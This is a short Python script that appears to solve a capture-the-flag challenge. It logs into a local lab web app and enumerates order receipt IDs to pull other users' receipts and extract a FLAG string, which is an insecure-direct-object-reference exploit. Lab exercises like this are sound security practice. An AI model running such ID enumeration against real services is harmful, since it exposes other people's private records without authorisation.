import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re

BASE = "http://127.0.0.1:32781"

# Configure session with connection pooling
s = requests.Session()
adapter = HTTPAdapter(
    pool_connections=1,
    pool_maxsize=1,
    max_retries=Retry(total=0)
)
s.mount('http://', adapter)

# Login
print("Logging in...")
s.post(f"{BASE}/login", data={"username": "test"})
s.post(f"{BASE}/login", data={"password": "test"})
print(f"Cookies: {dict(s.cookies)}")

# Test small range first
print("\nTesting 300000-300020...")
for i in range(300000, 300021):
    try:
        r = s.get(f"{BASE}/order/{i}/receipt", timeout=5)
        print(f"{i}: {r.status_code}")
        if r.status_code == 200:
            print(r.text)
            f = re.findall(r'FLAG\{[^}]+\}', r.text)
            if f:
                print(f"FLAG: {f[0]}")
    except Exception as e:
        print(f"{i}: Error - {e}")

s.close()

